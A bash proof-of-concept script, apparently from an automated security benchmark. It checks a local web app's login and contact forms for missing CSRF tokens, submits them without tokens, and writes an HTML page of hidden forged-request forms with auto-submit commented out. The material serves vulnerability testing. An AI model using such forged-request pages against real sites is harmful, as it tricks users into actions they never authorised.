#!/bin/bash
# POC: Demonstrates missing CSRF token protection on login and contact forms. Shows that forms can be submitted without CSRF tokens and creates a malicious HTML page that can perform CSRF attacks.
# Target: ./repo
# Created: 2025-11-07T16:38:09.053Z
# Session: benchmark-XBEN-097-24-mhp2dzly

# CSRF Token Missing Protection POC
# This script demonstrates the lack of CSRF token protection on vulnerable forms

TARGET_URL="http://localhost:3000"
LOGIN_FORM="$TARGET_URL/login.php"
CONTACT_FORM="$TARGET_URL/contact.php"

echo "[*] CSRF Token Missing Protection - Proof of Concept"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check login form for CSRF token
echo "[Step 1] Analyzing login form for CSRF protection..."
echo "GET $LOGIN_FORM"
LOGIN_RESPONSE=$(curl -s "$LOGIN_FORM")
echo "$LOGIN_RESPONSE"
echo ""

if echo "$LOGIN_RESPONSE" | grep -q "csrf_token\|csrf\|token"; then
    echo "[!] CSRF token found in login form"
else
    echo "[+] VULNERABILITY: No CSRF token found in login form"
fi
echo ""

# Step 2: Check contact form for CSRF token
echo "[Step 2] Analyzing contact form for CSRF protection..."
echo "GET $CONTACT_FORM"
CONTACT_RESPONSE=$(curl -s "$CONTACT_FORM")
echo "$CONTACT_RESPONSE"
echo ""

if echo "$CONTACT_RESPONSE" | grep -q "csrf_token\|csrf\|token"; then
    echo "[!] CSRF token found in contact form"
else
    echo "[+] VULNERABILITY: No CSRF token found in contact form"
fi
echo ""

# Step 3: Attempt to submit login form without CSRF token
echo "[Step 3] Attempting to submit login form without CSRF token..."
CSRF_TEST=$(curl -s -X POST "$LOGIN_FORM" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser&password=testpass" \
  -w "\nHTTP_STATUS:%{http_code}\n")

if echo "$CSRF_TEST" | grep -q "HTTP_STATUS:200\|HTTP_STATUS:302"; then
    echo "[+] VULNERABILITY: Form accepted POST request without CSRF token"
    echo "Response:"
    echo "$CSRF_TEST" | head -20
else
    echo "[-] Form rejected request or returned error"
    echo "$CSRF_TEST" | head -20
fi
echo ""

# Step 4: Attempt to submit contact form without CSRF token
echo "[Step 4] Attempting to submit contact form without CSRF token..."
CONTACT_TEST=$(curl -s -X POST "$CONTACT_FORM" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=testuser&email=test@example.com&message=test" \
  -w "\nHTTP_STATUS:%{http_code}\n")

if echo "$CONTACT_TEST" | grep -q "HTTP_STATUS:200\|HTTP_STATUS:302"; then
    echo "[+] VULNERABILITY: Form accepted POST request without CSRF token"
    echo "Response:"
    echo "$CONTACT_TEST" | head -20
else
    echo "[-] Form rejected request or returned error"
    echo "$CONTACT_TEST" | head -20
fi
echo ""

# Step 5: Create proof-of-concept malicious HTML file
echo "[Step 5] Creating malicious CSRF attack HTML proof-of-concept..."
CSRF_POC_HTML="csrf_attack_poc.html"

cat > "$CSRF_POC_HTML" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>CSRF Attack Proof of Concept</h1>
    <p>This page demonstrates a CSRF attack on the vulnerable application.</p>
    <p>If a user is already logged into the target application and visits this page,
       the forms below will automatically submit, performing unauthorized actions.</p>
    
    <h2>Attack Form 1: Unauthorized Contact Submission</h2>
    <form id="csrf_contact" action="http://localhost:3000/contact.php" method="POST" style="display:none;">
        <input type="hidden" name="name" value="CSRF Attack Bot">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="message" value="This is a CSRF attack! The form was submitted without user consent.">
    </form>
    
    <h2>Attack Form 2: Unauthorized Login Attempt</h2>
    <form id="csrf_login" action="http://localhost:3000/login.php" method="POST" style="display:none;">
        <input type="hidden" name="username" value="attacker">
        <input type="hidden" name="password" value="malicious">
    </form>
    
    <p><strong>The CSRF attack forms above would automatically submit because:</strong></p>
    <ul>
        <li>No CSRF token validation is implemented</li>
        <li>The server accepts POST requests from any origin</li>
        <li>No SameSite cookie attribute protection</li>
        <li>No Origin/Referer header validation</li>
    </ul>
    
    <p>In a real attack, JavaScript would automatically submit these forms when the page loads.</p>
    
    <script>
        // Uncomment to auto-submit CSRF attacks:
        // document.getElementById('csrf_contact').submit();
        // document.getElementById('csrf_login').submit();
    </script>
</body>
</html>
EOF

if [ -f "$CSRF_POC_HTML" ]; then
    echo "[+] Created CSRF attack POC HTML file: $CSRF_POC_HTML"
    echo "[+] This HTML file demonstrates how an attacker can exploit the missing CSRF protection"
else
    echo "[-] Failed to create CSRF attack POC HTML"
fi
echo ""

echo "[*] POC Execution Complete"
echo "[*] Summary: Missing CSRF token protection confirmed on both forms"